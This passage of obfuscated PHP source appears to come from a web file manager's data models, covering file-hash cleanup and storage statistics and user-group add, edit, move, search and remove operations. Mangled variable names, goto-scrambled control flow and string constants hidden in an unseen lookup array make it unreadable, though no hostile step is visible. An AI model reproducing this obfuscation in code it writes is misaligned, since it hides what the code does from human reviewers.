$this->where($cîØ©ƒŠ¸½)->setAdd($dÁ«¾ºÈàî[1756], $fâì ÈÚ× ); } goto e¶«…“”óÑ; e¶«…“”óÑ: } public function findByHash($EõÔµÔÇ–ø, $cÏ•“Âå– = false) { $EŠÇñ¢´±Š =& $_SERVER[…ë˜õ]; if (!$EõÔµÔÇ–ø && !$cÏ•“Âå–) { return !1; } $fÓã‹ì±¨ = array($EŠÇñ¢´±Š[1753] => $EõÔµÔÇ–ø); if ($cÏ•“Âå–) { $fÓã‹ì±¨ = array($EŠÇñ¢´±Š[1754] => $cÏ•“Âå–); } return $this->order($EŠÇñ¢´±Š[1757])->where($fÓã‹ì±¨)->find(); } public function clearEmpty($dÂ›Ğï†ä¸ = 0) { goto dµÕÅğ‡Óï; f°÷¢™îÄ½: foreach ($fë©”†§ÈÛ as $AªãöäùÌ) { $eî³æÍÍ¬¼->update(1); $this->resetFile($AªãöäùÌ); } $eî³æÍÍ¬¼->end(); goto c÷ìˆØ´Ü­; AÎâ¥¶‹ ¿: $fë©”†§ÈÛ = $this->where($c—óƒÙÃƒÍ)->select(); if (!$fë©”†§ÈÛ) { return; } $eî³æÍÍ¬¼ = new Task($e”´³ÏÛ­[1759], $e”´³ÏÛ­[33], count($fë©”†§ÈÛ)); goto f°÷¢™îÄ½; dµÕÅğ‡Óï: $e”´³ÏÛ­ =& $_SERVER[…ë˜õ]; $dô›ÈÏ¨‰¸ = time() - 3600 * 24 * $dÂ›Ğï†ä¸; $c—óƒÙÃƒÍ = $e”´³ÏÛ­[1758] . $dô›ÈÏ¨‰¸; goto AÎâ¥¶‹ ¿; c÷ìˆØ´Ü­: } public function resetFile($cäè¬ëÏ†) { goto dÌ‹âÖ‚±; aêÃœ¥ŒÖØ: if ($cäè¬ëÏ†[$Cª–¸É»‹ï[1756]] != $BîÂ’Õºí) { $this->where($fï¨ÓÕ½ğÂ)->save(array($Cª–¸É»‹ï[1752] => $BîÂ’Õºí)); } goto A¤Ã¬•†Â; dÌ‹âÖ‚±: $Cª–¸É»‹ï =& $_SERVER[…ë˜õ]; $fï¨ÓÕ½ğÂ = array($Cª–¸É»‹ï[442] => $cäè¬ëÏ†[$Cª–¸É»‹ï[441]]); $F›ê‹ë”… = Model($Cª–¸É»‹ï[1209])->where($fï¨ÓÕ½ğÂ)->count(); goto c•¿ğÆ‚ˆ”; c•¿ğÆ‚ˆ”: $d…·õŞâµ§ = Model($Cª–¸É»‹ï[1760])->where($fï¨ÓÕ½ğÂ)->count(); $BîÂ’Õºí = intval($F›ê‹ë”…) + intval($d…·õŞâµ§); if ($BîÂ’Õºí == 0) { IO::remove($cäè¬ëÏ†[$Cª–¸É»‹ï[75]]); Model($Cª–¸É»‹ï[1761])->delete($cäè¬ëÏ†[$Cª–¸É»‹ï[441]]); $this->where($fï¨ÓÕ½ğÂ)->delete(); $this->metaSet($cäè¬ëÏ†[$Cª–¸É»‹ï[441]], null, null); return; } goto aêÃœ¥ŒÖØ; A¤Ã¬•†Â: } public function storageInfo($c©“÷Ÿí›Ä = false) { goto cÃùáªõÀ·; fÄì×ƒùÍ†: for ($f“‚ØÛ‚³ = 0; $f“‚ØÛ‚³ < $a¡¨ö£’éî; $f“‚ØÛ‚³ = $f“‚ØÛ‚³ + $c£ğ±§ÈŸ¯) { $E¾‚Îƒ©Òˆ = $this->limit($f“‚ØÛ‚³, $f“‚ØÛ‚³ + $c£ğ±§ÈŸ¯)->select(); foreach ($E¾‚Îƒ©Òˆ as $fìà»Ë·») { $b´åµÜí®ö += $fìà»Ë·»[$A£Ë–ÎÚºó[77]] * $fìà»Ë·»[$A£Ë–ÎÚºó[1756]]; $cÑà‚‚Œƒ += $fìà»Ë·»[$A£Ë–ÎÚºó[77]] * ($fìà»Ë·»[$A£Ë–ÎÚºó[1756]] - 1); $aÇÍçˆğµ˜ += $fìà»Ë·»[$A£Ë–ÎÚºó[1756]]; } } $A™Ë§¨ÏóÆ = array($A£Ë–ÎÚºó[1762] => $b´åµÜí®ö, $A£Ë–ÎÚºó[1763] => $cÑà‚‚Œƒ, $A£Ë–ÎÚºó[1764] => $cÑà‚‚Œƒ / $b´åµÜí®ö, $A£Ë–ÎÚºó[81] => $a¡¨ö£’éî, $A£Ë–ÎÚºó[1765] => $aÇÍçˆğµ˜); return $A™Ë§¨ÏóÆ; goto fÄÉ™°ßœ; bíÍ¢Ïªˆ¾: $b´åµÜí®ö = 1; $aÇÍçˆğµ˜ = 0; $c£ğ±§ÈŸ¯ = 5000; goto fÄì×ƒùÍ†; cÃùáªõÀ·: $A£Ë–ÎÚºó =& $_SERVER[…ë˜õ]; $a¡¨ö£’éî = $this->count() + 0.0; $cÑà‚‚Œƒ = 0; goto bíÍ¢Ïªˆ¾; fÄÉ™°ßœ: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\x70"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\155\145" => "\147\x72\x6f\x75\160\x5f\x6d\x65\x74\x61", "\x6d\x65\164\141\106\x69\x65\x6c\x64" => "\147\162\157\165\160\x49\x44"); protected function cacheFunctionAlias($dí¼¥šŠ›±) { $eùçæ…‚Ä– =& $_SERVER[…ë˜õ]; return array($eùçæ…‚Ä–[1766] => array($dí¼¥šŠ›±[0], $eùçæ…‚Ä–[1767]), $eùçæ…‚Ä–[1768] => array($dí¼¥šŠ›±[0], $eùçæ…‚Ä–[1767])); } protected function getInfo($bªÛ¤Ë¢¥) { $dİÈŞœ¶…Õ = $this->getInfoSimple($bªÛ¤Ë¢¥); if (!$dİÈŞœ¶…Õ) { return !1; } return $this->_listDataApplyItem($dİÈŞœ¶…Õ); } protected function getInfoSimple($Bø¿¿°î¦ç, $b‰•ášæŠË = false) { $aîõ¨¥‚ÓÖ =& $_SERVER[…ë˜õ]; if ($b‰•ášæŠË) { $Dá’®’äŠÒ = array($aîõ¨¥‚ÓÖ[1694] => intval($Bø¿¿°î¦ç)); $AÄää‹ãÕ¯ = $this->where($Dá’®’äŠÒ)->find(); return is_array($AÄää‹ãÕ¯) ? $AÄää‹ãÕ¯ : array(); } return $this->cacheFunctionGet($aîõ¨¥‚ÓÖ[1769], $Bø¿¿°î¦ç); } protected function groupAdd($AÓĞÉŠƒù) { goto aÖöºæ›è; Dº§‡…“ò¥: if ($Aëö²ğ‡äÕ[$d˜¨ƒÆàÈà[481]]) { $Dƒ‘¼…ƒšˆ = $Aëö²ğ‡äÕ[$d˜¨ƒÆàÈà[481]] . $Aëö²ğ‡äÕ[$d˜¨ƒÆàÈà[1694]] . $d˜¨ƒÆàÈà[47]; } $EĞÅ·‘«Ã“ = array($d˜¨ƒÆàÈà[407] => $this->groupNameAuto($AÓĞÉŠƒù[$d˜¨ƒÆàÈà[472]], $AÓĞÉŠƒù[$d˜¨ƒÆàÈà[28]]), $d˜¨ƒÆàÈà[389] => $AÓĞÉŠƒù[$d˜¨ƒÆàÈà[472]], $d˜¨ƒÆàÈà[548] => $Dƒ‘¼…ƒšˆ, $d˜¨ƒÆàÈà[1770] => $AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1678]], $d˜¨ƒÆàÈà[1771] => 0, $d˜¨ƒÆàÈà[1698] => 0); if (isset($AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1717]])) { $EĞÅ·‘«Ã“[$d˜¨ƒÆàÈà[1717]] = $AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1717]]; } else { $Cì†”…Øå¤ = $this->max($d˜¨ƒÆàÈà[1717]); if (!$Cì†”…Øå¤) { $Cì†”…Øå¤ = 0; } $EĞÅ·‘«Ã“[$d˜¨ƒÆàÈà[1717]] = $Cì†”…Øå¤ + 1; } goto D›˜¸£Ö“; BĞæ·³´±: if (isset($AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1772]])) { $this->metaSet($EèùÌ¸êŒ², array($d˜¨ƒÆàÈà[1772] => $AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1772]], $d˜¨ƒÆàÈà[1773] => $AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1773]])); unset($AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1772]]); unset($AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1773]]); } Model($d˜¨ƒÆàÈà[1209])->groupRootAdd($EèùÌ¸êŒ²); return $EèùÌ¸êŒ²; goto cˆéíâĞ¶„; aÖöºæ›è: $d˜¨ƒÆàÈà =& $_SERVER[…ë˜õ]; if (!$AÓĞÉŠƒù[$d˜¨ƒÆàÈà[472]] && isset($AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1694]]) && $AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1694]] == 1) { if ($Aëö²ğ‡äÕ = $this->getInfoSimple($AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1694]], !0)) { return $AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1694]]; } } else { $Aëö²ğ‡äÕ = $this->getInfoSimple($AÓĞÉŠƒù[$d˜¨ƒÆàÈà[472]]); if (!$Aëö²ğ‡äÕ) { return !1; } } $Dƒ‘¼…ƒšˆ = $d˜¨ƒÆàÈà[493]; goto Dº§‡…“ò¥; D›˜¸£Ö“: if (!empty($AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1694]])) { $EĞÅ·‘«Ã“[$d˜¨ƒÆàÈà[1694]] = $AÓĞÉŠƒù[$d˜¨ƒÆàÈà[1694]]; } $EèùÌ¸êŒ² = $this->add($EĞÅ·‘«Ã“); $this->setNamePinyin($EèùÌ¸êŒ², $EĞÅ·‘«Ã“[$d˜¨ƒÆàÈà[28]]); goto BĞæ·³´±; cˆéíâĞ¶„: } protected function groupEdit($aèñ×¬í, $e¨Ñ°´…Ù ) { goto C…¢éñà¹; fÇî†¡ó©: if (!empty($e¨Ñ°´…Ù [$aŞˆÚ¢º‹[472]])) { $CÓÊ¦ÕÊï = $this->getInfoSimple($e¨Ñ°´…Ù [$aŞˆÚ¢º‹[472]]); if (!$CÓÊ¦ÕÊï) { return !1; } if ($C¶’Ä®ªù[$aŞˆÚ¢º‹[1694]] == $CÓÊ¦ÕÊï[$aŞˆÚ¢º‹[1694]]) { return !1; } if ($e¨Ñ°´…Ù [$aŞˆÚ¢º‹[472]] != $C¶’Ä®ªù[$aŞˆÚ¢º‹[472]]) { if ($CÓÊ¦ÕÊï[$aŞˆÚ¢º‹[481]] !== $C¶’Ä®ªù[$aŞˆÚ¢º‹[481]] && strpos($CÓÊ¦ÕÊï[$aŞˆÚ¢º‹[481]], $C¶’Ä®ªù[$aŞˆÚ¢º‹[481]] . $C¶’Ä®ªù[$aŞˆÚ¢º‹[1694]] . $aŞˆÚ¢º‹[47]) === 0) { return !1; } $e¨Ñ°´…Ù [$aŞˆÚ¢º‹[548]] = $CÓÊ¦ÕÊï[$aŞˆÚ¢º‹[481]] . $e¨Ñ°´…Ù [$aŞˆÚ¢º‹[472]] . $aŞˆÚ¢º‹[47]; $this->_changeChildLevel($C¶’Ä®ªù, $CÓÊ¦ÕÊï); } } if (isset($e¨Ñ°´…Ù [$aŞˆÚ¢º‹[28]])) { $this->setNamePinyin($aèñ×¬í, $e¨Ñ°´…Ù [$aŞˆÚ¢º‹[28]]); } if (isset($e¨Ñ°´…Ù [$aŞˆÚ¢º‹[1772]])) { $this->metaSet($aèñ×¬í, array($aŞˆÚ¢º‹[1772] => $e¨Ñ°´…Ù [$aŞˆÚ¢º‹[1772]], $aŞˆÚ¢º‹[1773] => $e¨Ñ°´…Ù [$aŞˆÚ¢º‹[1773]])); unset($e¨Ñ°´…Ù [$aŞˆÚ¢º‹[1772]]); unset($e¨Ñ°´…Ù [$aŞˆÚ¢º‹[1773]]); } goto F™ˆ´÷—¯à; C…¢éñà¹: $aŞˆÚ¢º‹ =& $_SERVER[…ë˜õ]; $C¶’Ä®ªù = $this->getInfoSimple($aèñ×¬í); if (!$C¶’Ä®ªù) { return !1; } goto fÇî†¡ó©; F™ˆ´÷—¯à: if (isset($e¨Ñ°´…Ù [$aŞˆÚ¢º‹[28]]) && $e¨Ñ°´…Ù [$aŞˆÚ¢º‹[28]] != $C¶’Ä®ªù[$aŞˆÚ¢º‹[28]]) { $this->_clearChildrenCache($C¶’Ä®ªù); } return $this->where(array($aŞˆÚ¢º‹[1774] => $aèñ×¬í))->save($e¨Ñ°´…Ù ); goto e„¼±‚•Ü; e„¼±‚•Ü: } private function _clearChildrenCache($EÑÇÕ÷†) { $B‰“ƒá ¸¿ =& $_SERVER[…ë˜õ]; $E·Úõ£†‘ = array($B‰“ƒá ¸¿[548] => array($B‰“ƒá ¸¿[507], $EÑÇÕ÷†[$B‰“ƒá ¸¿[481]] . $EÑÇÕ÷†[$B‰“ƒá ¸¿[1694]] . $B‰“ƒá ¸¿[508])); $c³Æ›çÌë‡ = $this->field($B‰“ƒá ¸¿[1694])->where($E·Úõ£†‘)->select(); foreach ($c³Æ›çÌë‡ as $CÂ ˆô£¬¼) { $this->cacheFunctionClear($B‰“ƒá ¸¿[1775], $CÂ ˆô£¬¼[$B‰“ƒá ¸¿[1694]]); $this->cacheFunctionClear($B‰“ƒá ¸¿[1769], $CÂ ˆô£¬¼[$B‰“ƒá ¸¿[1694]]); } } private function _changeChildLevel($C–ÎÙ¯Ïµñ, $d’åé«£­Ø, $BŞ“œÙ»† = false) { goto CŠé‚–¸¿; Aï“áºÙ˜: if ($BŞ“œÙ»†) { $BÜ‹¨¢°Ñ… = $d’åé«£­Ø[$eâÚŠæ¨–[481]] . $d’åé«£­Ø[$eâÚŠæ¨–[1694]] . $eâÚŠæ¨–[47]; } $e„àöÒÉÇ« = array($eâÚŠæ¨–[548] => array($eâÚŠæ¨–[507], $C–ÎÙ¯Ïµñ[$eâÚŠæ¨–[481]] . $C–ÎÙ¯Ïµñ[$eâÚŠæ¨–[1694]] . $eâÚŠæ¨–[508])); $D×¢­¾¡Í = array($eâÚŠæ¨–[548] => array($eâÚŠæ¨–[556], "\162\145\160\154\x61\x63\145\x28\160\141\x72\145\x6e\164\x4c\145\166\x65\x6c\x2c\x27{$C‰…Ø÷¸­œ}\47\54\x27{$BÜ‹¨¢°Ñ…}\x27\x29")); goto FÕ®àÎ—‚; FÕ®àÎ—‚: $this->_clearChildrenCache($C–ÎÙ¯Ïµñ); $this->where($e„àöÒÉÇ«)->data($D×¢­¾¡Í)->save(); goto dŒ•§¬³Ÿ; CŠé‚–¸¿: $eâÚŠæ¨– =& $_SERVER[…ë˜õ]; $C‰…Ø÷¸­œ = $C–ÎÙ¯Ïµñ[$eâÚŠæ¨–[481]] . $C–ÎÙ¯Ïµñ[$eâÚŠæ¨–[1694]] . $eâÚŠæ¨–[47]; $BÜ‹¨¢°Ñ… = $d’åé«£­Ø[$eâÚŠæ¨–[481]] . $d’åé«£­Ø[$eâÚŠæ¨–[1694]] . $eâÚŠæ¨–[47] . $C–ÎÙ¯Ïµñ[$eâÚŠæ¨–[1694]] . $eâÚŠæ¨–[47]; goto Aï“áºÙ˜; dŒ•§¬³Ÿ: } public function setNamePinyin($Aç‹èŠ¢¼¨, $C‚ÁËÃŠ’¨ = false) { $E·ŠîÍ¯„Æ =& $_SERVER[…ë˜õ]; if (!$C‚ÁËÃŠ’¨) { $f—¡¢¤»¤Õ = $this->getInfoSimple($Aç‹èŠ¢¼¨); $C‚ÁËÃŠ’¨ = $f—¡¢¤»¤Õ[$E·ŠîÍ¯„Æ[28]]; } if (!Input::check($C‚ÁËÃŠ’¨, $E·ŠîÍ¯„Æ[551])) { $this->metaSet($Aç‹èŠ¢¼¨, $E·ŠîÍ¯„Æ[438], null); $this->metaSet($Aç‹èŠ¢¼¨, $E·ŠîÍ¯„Æ[437], null); return; } $AŸ¼¶Ù = array($E·ŠîÍ¯„Æ[438] => str_replace($E·ŠîÍ¯„Æ[50], $E·ŠîÍ¯„Æ[33], Pinyin::encode($C‚ÁËÃŠ’¨)), $E·ŠîÍ¯„Æ[437] => Pinyin::encode($C‚ÁËÃŠ’¨, $E·ŠîÍ¯„Æ[552])); $this->metaSet($Aç‹èŠ¢¼¨, $AŸ¼¶Ù); } protected function groupStatus($eÆ¾§¥áª•, $D‹ä´ÌÕ…Á) { goto Cµê¢…Öí; f¬™ìË¦™: foreach ($c•ªÎ—«½Ş as $eÆ¾§¥áª•) { $A“…‹Ù¹³[] = array($Eß¤±À³‘[1694] => $eÆ¾§¥áª•, $Eß¤±À³‘[92] => $Eß¤±À³‘[731], $Eß¤±À³‘[370] => $D‹ä´ÌÕ…Á); } return Model($Eß¤±À³‘[1776])->addAll($A“…‹Ù¹³, array(), !0); goto AÌ„Ã­›‰ù; aÔîÅá¿Ü‡: if ($D‹ä´ÌÕ…Á == $Eß¤±À³‘[86]) { $c•ªÎ—«½Ş = $this->parentLevelArray($BÙøÄ÷ŞèÇ[$Eß¤±À³‘[481]]); } else { $a¸²æğí‰Í = array($Eß¤±À³‘[548] => array($Eß¤±À³‘[507], $BÙøÄ÷ŞèÇ[$Eß¤±À³‘[481]] . $BÙøÄ÷ŞèÇ[$Eß¤±À³‘[1694]] . $Eß¤±À³‘[508])); $c•ªÎ—«½Ş = $this->where($a¸²æğí‰Í)->field($Eß¤±À³‘[1694])->select(); $c•ªÎ—«½Ş = array_to_keyvalue($c•ªÎ—«½Ş, $Eß¤±À³‘[33], $Eß¤±À³‘[1694]); } $c•ªÎ—«½Ş[] = $BÙøÄ÷ŞèÇ[$Eß¤±À³‘[1694]]; $A“…‹Ù¹³ = array(); goto f¬™ìË¦™; Cµê¢…Öí: $Eß¤±À³‘ =& $_SERVER[…ë˜õ]; $BÙøÄ÷ŞèÇ = $this->getInfoSimple($eÆ¾§¥áª•); if (!$BÙøÄ÷ŞèÇ) { return !1; } goto aÔîÅá¿Ü‡; AÌ„Ã­›‰ù: } protected function groupRemove($F– ”±) { goto d»©±à÷à; a˜®‹Ë“ìñ: Model($f™£ØéŒâ[796])->groupRootRemove($F– ”±); return $this->where($C’‘ôÃ”è¯)->delete(); goto FÁ¹™´´¸; B…Öñ–ñö: $this->where(array($f™£ØéŒâ[472] => $F– ”±))->save(array($f™£ØéŒâ[472] => $dŸŒ±•’Î—[$f™£ØéŒâ[472]])); Model($f™£ØéŒâ[1776])->where($C’‘ôÃ”è¯)->delete(); Model($f™£ØéŒâ[1777])->where($C’‘ôÃ”è¯)->delete(); goto a˜®‹Ë“ìñ; fÅËŒÁ¨Ö÷: if (!$dŸŒ±•’Î— || $dŸŒ±•’Î—[$f™£ØéŒâ[472]] == 0) { return !1; } $B“ÊóÏÖ¥• = $this->getInfoSimple($dŸŒ±•’Î—[$f™£ØéŒâ[472]]); $this->_changeChildLevel($dŸŒ±•’Î—, $B“ÊóÏÖ¥•, !0); goto B…Öñ–ñö; d»©±à÷à: $f™£ØéŒâ =& $_SERVER[…ë˜õ]; $C’‘ôÃ”è¯ = array($f™£ØéŒâ[1694] => $F– ”±); $dŸŒ±•’Î— = $this->where($C’‘ôÃ”è¯)->find(); goto fÅËŒÁ¨Ö÷; FÁ¹™´´¸: } protected function groupSort($a˜îß¶»á) { $f§Ş²ê”Ó =& $_SERVER[…ë˜õ]; $f†ñÚÇä½Š = array(); foreach ($a˜îß¶»á as $a›Ê©ßÌß => $D„°¤”Ğåƒ) { $f†ñÚÇä½Š[] = array($f§Ş²ê”Ó[1694], $D„°¤”Ğåƒ, $f§Ş²ê”Ó[1717], $a›Ê©ßÌß + 1); } $this->saveAll($f†ñÚÇä½Š); } public function listData() { $câø¼·ùÄ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($câø¼·ùÄ[$_SERVER[…ë˜õ][365]]); return $câø¼·ùÄ; } private function _makeOrder($c‡†Ò¤Ÿôœ = '') { goto A›Ôò°ğí; bªŞìëçİù: $AÛ»ŸÄÂ„‘ = Input::get($A–²„½¯ƒÂ[429], $A–²„½¯ƒÂ[7], $A–²„½¯ƒÂ[1698], $cŠ»Ìö‡Â’); $CÚè†Ø­±ù = Input::get($A–²„½¯ƒÂ[430], $A–²„½¯ƒÂ[7], $A–²„½¯ƒÂ[1778], array($A–²„½¯ƒÂ[1778], $A–²„½¯ƒÂ[424])); $CÚè†Ø­±ù = $E‚ƒÏ‚í[$CÚè†Ø­±ù]; goto Eø§ºö¸”Ó; A›Ôò°ğí: $A–²„½¯ƒÂ =& $_SERVER[…ë˜õ]; $cŠ»Ìö‡Â’ = array($A–²„½¯ƒÂ[1694], $A–²„½¯ƒÂ[28], $A–²„½¯ƒÂ[1680], $A–²„½¯ƒÂ[192]); $E‚ƒÏ‚í = array($A–²„½¯ƒÂ[422] => $A–²„½¯ƒÂ[423], $A–²„½¯ƒÂ[424] => $A–²„½¯ƒÂ[425]); goto bªŞìëçİù; Eø§ºö¸”Ó: $c‡†Ò¤Ÿôœ = $c‡†Ò¤Ÿôœ . "{$AÛ»ŸÄÂ„‘}\40{$CÚè†Ø­±ù}\x2c\40\x67\162\157\165\x70\111\104\40\x61\163\143"; return $this->order($c‡†Ò¤Ÿôœ); goto Bèêª‘â›‰; Bèêª‘â›‰: } public function listChild($DãÑå©Ïé) { $cÖšöÍ¯¸Í =& $_SERVER[…ë˜õ]; $E¸ëøÌ = $this->where(array($cÖšöÍ¯¸Í[472] => $DãÑå©Ïé))->_makeOrder()->selectPage(200); $this->_listDataApply($E¸ëøÌ[$cÖšöÍ¯¸Í[365]]); return $E¸ëøÌ; } public function listByID($b‰¸ª‡¦‡Œ) { $böÁøøğ† =& $_SERVER[…ë˜õ]; if (!$b‰¸ª‡¦‡Œ) { return array(); } $cÂÏÂ»‡Ìğ = array($böÁøøğ†[1694] => array($böÁøøğ†[7], $b‰¸ª‡¦‡Œ)); $cØ—ê¦»ÜÕ = $this->where($cÂÏÂ»‡Ìğ)->select(); $this->_listDataApply($cØ—ê¦»ÜÕ); return $cØ—ê¦»ÜÕ; } public function listSearch($fÏÓ›²å‚›) { goto A¡»ÕÏ‰¤º; B†ƒœø•“¯: $F§‰ÛÆäÛã = $F§‰ÛÆäÛã ? $F§‰ÛÆäÛã : array($D²¤‘Ä’ö‘[365] => array(), $D²¤‘Ä’ö‘[362] => array()); if (!$F§‰ÛÆäÛã || count($F§‰ÛÆäÛã[$D²¤‘Ä’ö‘[365]]) < 5 && Input::check($B„‰±Ã‚ë¥, $D²¤‘Ä’ö‘[314])) { goto a½ËšÖ®¬™; F¹âê¸òªù: $F§‰ÛÆäÛã[$D²¤‘Ä’ö‘[362]][$D²¤‘Ä’ö‘[364]] = ceil($F§‰ÛÆäÛã[$D²¤‘Ä’ö‘[362]][$D²¤‘Ä’ö‘[363]] / $F§‰ÛÆäÛã[$D²¤‘Ä’ö‘[362]][$D²¤‘Ä’ö‘[359]]); goto aê³Œªäšá; fÂÆ¡åá„Ä: $dÚ±É£Å = array_merge($a­öØ²ÔÓÖ, $c¡ìåÏñš­, $F§‰ÛÆäÛã[$D²¤‘Ä’ö‘[365]]); $F§‰ÛÆäÛã[$D²¤‘Ä’ö‘[365]] = array_unique_by_key($dÚ±É£Å, $D²¤‘Ä’ö‘[1694]); $F§‰ÛÆäÛã[$D²¤‘Ä’ö‘[362]][$D²¤‘Ä’ö‘[363]] = count($F§‰ÛÆäÛã[$D²¤‘Ä’ö‘[365]]); goto F¹âê¸òªù; a½ËšÖ®¬™: $AÙšˆŠ¯ = $this->groupChildrenAll($eùÈÕ¿¥); $a­öØ²ÔÓÖ = $this->_searchFromMeta($D²¤‘Ä’ö‘[437], $B„‰±Ã‚ë¥, 10, $AÙšˆŠ¯); $c¡ìåÏñš­ = $this->_searchFromMeta($D²¤‘Ä’ö‘[438], $B„‰±Ã‚ë¥, 10, $AÙšˆŠ¯); goto fÂÆ¡åá„Ä; aê³Œªäšá: } $this->_listDataApply($F§‰ÛÆäÛã[$D²¤‘Ä’ö‘[365]]); goto d±„Áí²²; d‡Âõ‰Û¡­: if (!trim($B„‰±Ã‚ë¥)) { return !1; } $B„‰±Ã‚ë¥ = str_replace($D²¤‘Ä’ö‘[1781], $D²¤‘Ä’ö‘[1782], $B„‰±Ã‚ë¥); $cÒÒ¸àê„Ê = array($D²¤‘Ä’ö‘[1694] => array($D²¤‘Ä’ö‘[378], "{$B„‰±Ã‚ë¥}\45"), $D²¤‘Ä’ö‘[28] => array($D²¤‘Ä’ö‘[378], "\x25{$B„‰±Ã‚ë¥}\x25"), $D²¤‘Ä’ö‘[963] => $D²¤‘Ä’ö‘[1783]); goto FßÃªœİÎ; FßÃªœİÎ: if ($eùÈÕ¿¥) { $f¹¥ÃÕ›¨¸ = $this->getInfoSimple($eùÈÕ¿¥); $då‡¤±¥ˆ… = $f¹¥ÃÕ›¨¸[$D²¤‘Ä’ö‘[481]] . $eùÈÕ¿¥ . $D²¤‘Ä’ö‘[508]; $cÒÒ¸àê„Ê = array($cÒÒ¸àê„Ê, array($D²¤‘Ä’ö‘[481] => array($D²¤‘Ä’ö‘[378], $då‡¤±¥ˆ…))); } $cÒÒ¸àê„Ê = $this->parseWhereLike($cÒÒ¸àê„Ê); $F§‰ÛÆäÛã = $this->_makeOrder()->where($cÒÒ¸àê„Ê)->selectPage(20); goto B†ƒœø•“¯; A¡»ÕÏ‰¤º: $D²¤‘Ä’ö‘ =& $_SERVER[…ë˜õ]; $B„‰±Ã‚ë¥ = $fÏÓ›²å‚›[$D²¤‘Ä’ö‘[1779]]; $eùÈÕ¿¥ = isset($fÏÓ›²å‚›[$D²¤‘Ä’ö‘[1780]]) ? $fÏÓ›²å‚›[$D²¤‘Ä’ö‘[1780]] : !1; goto d‡Âõ‰Û¡­; d±„Áí²²: return $F§‰ÛÆäÛã; goto dËŸÎĞÎ¯õ; dËŸÎĞÎ¯õ: } protected function groupChildrenAll($C¬§ãà‡äê) { $B¯ÓÚö­»’ =& $_SERVER[…ë˜õ]; if (!$C¬§ãà‡äê) { return !1; } if (is_string($C¬§ãà‡äê)) { $C¬§ãà‡äê = array($C¬§ãà‡äê); } $aÓÈÈ¾·öœ = $C¬§ãà‡äê; foreach ($C¬§ãà‡äê as $CÔğß„‚Á) { $F™ó²Š°Š° = $this->getInfoSimple($CÔğß„‚Á); $bì¤›‚ï³ = array($B¯ÓÚö­»’[481] => array($B¯ÓÚö­»’[378], $F™ó²Š°Š°[$B¯ÓÚö­»’[481]] . $CÔğß„‚Á . $B¯ÓÚö­»’[508])); $C‘˜«Çâ¯ = $this->field($B¯ÓÚö­»’[1694])->where($bì¤›‚ï³)->select(); $aÓÈÈ¾·öœ = array_merge($aÓÈÈ¾·öœ, array_to_keyvalue($C‘˜«Çâ¯, $B¯ÓÚö­»’[33], $B¯ÓÚö­»’[1694])); } return array_unique($aÓÈÈ¾·öœ); } private function _searchFromMeta($aÖÁ³Ş¢µ¥, $cÒãËŠÙç, $eáÔ†»öÙô, $EäÒİÏˆ¦Ñ) { goto f°´×‚Ëâ¥; f°´×‚Ëâ¥: $B§ˆ¥¤’¨ =& $_SERVER[…ë˜õ]; $cÒãËŠÙç = strtolower($cÒãËŠÙç); $a‹˜œ»¥‰ = array($B§ˆ¥¤’¨[92] => $aÖÁ³Ş¢µ¥, $B§ˆ¥¤’¨[370] => array($B§ˆ¥¤’¨[378], "\x25{$cÒãËŠÙç}\x25")); goto Dš•÷¸Ú¨˜; aÓÉ‚•‚…ç: if (!$C¾å®÷´÷) { return array(); } return $C¾å®÷´÷; goto FíŸç ÈºŠ; Dš•÷¸Ú¨˜: $a‹˜œ»¥‰ = $this->parseWhereLike($a‹˜œ»¥‰); if ($EäÒİÏˆ¦Ñ) { $a‹˜œ»¥‰[$B§ˆ¥¤’¨[1694]] = array($B§ˆ¥¤’¨[7], $EäÒİÏˆ¦Ñ); } $EÙ ­†‡åÌ = Model($B§ˆ¥¤’¨[1784])->where($a‹˜œ»¥‰)->limit($eáÔ†»öÙô)->select(); goto dï¹¹‰Ñ”•; dï¹¹‰Ñ”•: if (!$EÙ ­†‡åÌ) { return array(); } $EÙ ­†‡åÌ = array_to_keyvalue($EÙ ­†‡åÌ, $B§ˆ¥¤’¨[33], $B§ˆ¥¤’¨[1694]); $C¾å®÷´÷ = $this->where(array($B§ˆ¥¤’¨[1774] => array($B§ˆ¥¤’¨[7], $EÙ ­†‡åÌ)))->select(); goto aÓÉ‚•‚…ç; FíŸç ÈºŠ: } protected function _listDataApplyItem($dóƒâ¼”ğÉ) { $Cï¨õÖ‘ã = array($dóƒâ¼”ğÉ); $this->_listDataApply($Cï¨õÖ‘ã); return $Cï¨õÖ‘ã[0]; } protected function _listDataApply(&$eÜ¡çæƒª) { goto f½½Ö¨£›°; B†Ì‰í¯ã«: $this->_listAppendParent($eÜ¡çæƒª); $this->_listAppendSourceRoot($eÜ¡çæƒª, $Fšå†é¿˜÷); goto DÈğ‚ÀÃö«; aÓĞ‡Ó­åê: $this->_listAppendChildren($eÜ¡çæƒª); $this->_listAppendChildrenMember($eÜ¡çæƒª); $this->_listAppendMeta($eÜ¡çæƒª, $Fšå†é¿˜÷); goto B†Ì‰í¯ã«; f½½Ö¨£›°: $B·©½×÷µ½ =& $_SERVER[…ë˜õ]; if (!$eÜ¡çæƒª) { return; } $Fšå†é¿˜÷ = array_to_keyvalue($eÜ¡çæƒª, $B·©½×÷µ½[33], $B·©½×÷µ½[1694]); goto aÓĞ‡Ó­åê; DÈğ‚ÀÃö«: } private function _listAppendChildren(&$aõ˜·ëôùÊ) { goto a­ô½·Ğ‡­; a­ô½·Ğ‡­: $F¡ÖÛ‹ä¼Ã =& $_SERVER[…ë˜õ]; $AÊöå¡³ª¦ = array_to_keyvalue($aõ˜·ëôùÊ, $F¡ÖÛ‹ä¼Ã[33], $F¡ÖÛ‹ä¼Ã[1694]); $a¾¯Ï ¥„¥ = array($F¡ÖÛ‹ä¼Ã[472] => 